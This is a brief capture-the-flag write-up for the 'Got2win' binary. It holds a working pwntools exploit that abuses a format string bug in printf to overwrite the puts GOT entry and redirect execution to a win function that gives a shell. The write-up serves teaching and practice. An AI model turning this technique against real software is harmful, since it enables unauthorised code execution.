### Got2win

#### TL;DR

Format string bug in echo function lead to puts got overwrite to execute win function

```python
#!/usr/bin/env python3

from pwn import *

e = ELF("./got2win")
#p = remote("34.100.187.70",5555)
p = process("./got2win")
exploit = b"%4199132x" + b"                        %11$lln" + p64(e.got.puts)
p.sendline(exploit)
p.interactive()
```



1)As the binary has partial relro,we can make got overwrites to get RIP control.

2)There is a secure fgets to get user input but the problem occurs is when it prints user input using printf

3)Printf here does not have the format specifiers present so we can use our  own format specifiers to leak and write anywhere.

4)So we overwrite puts got to the win function to get shell.
